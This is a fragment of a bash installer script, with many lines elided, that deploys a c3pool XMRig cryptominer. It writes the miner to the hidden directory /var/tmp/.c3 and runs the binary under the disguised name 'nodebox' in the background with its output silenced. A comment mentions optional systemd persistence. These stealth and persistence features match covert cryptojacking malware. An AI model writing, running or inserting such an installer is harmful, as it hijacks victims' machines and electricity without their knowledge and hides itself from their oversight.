...
# - /var/tmp/.c3 layout, wrapper script, and optional systemd persistence
...
INSTALL_DIR="/var/tmp/.c3"
ARCHIVE="/var/tmp/c3pool-xmrig.tar.gz"
...
log "[*] Creating $INSTALL_DIR/miner.sh"
cat > "$INSTALL_DIR/miner.sh" <<EOF_MINER
#!/usr/bin/env bash
...
start_without_systemd() {
  ...
  "$INSTALL_DIR/nodebox" --config="$INSTALL_DIR/config_background.json" >/dev/null 2>&1 &
}
...
EOF_SERVICE
  ...
  if [ "$TOUCH_OK" -eq 1 ]; then
    START_LINE="$INSTALL_DIR/nodebox --config=$INSTALL_DIR/config_background.json >/dev/null 2>&1 &"
